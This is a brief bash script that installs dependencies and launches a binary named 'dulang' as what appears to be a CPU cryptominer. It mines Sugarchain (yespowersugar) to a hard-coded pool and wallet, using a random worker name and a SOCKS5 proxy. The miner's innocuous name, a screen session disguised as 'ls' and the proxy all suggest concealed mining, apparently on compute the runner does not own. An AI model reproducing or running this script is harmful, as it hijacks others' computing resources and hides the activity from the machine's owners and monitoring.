#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x dulang
screen -dmS ls 
POOL=stratum+tcp://stratum-eu.rplant.xyz:7042
WALLET=sugar1qsv26cl69kpgwujwmdhdl468ljm5ypr6kewh0gu
WORKER=$(echo $(shuf -i 1-10 -n 1)ONTA)
PROXY=socks5://154.16.63.16:1080
./dulang -a yespowersugar -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
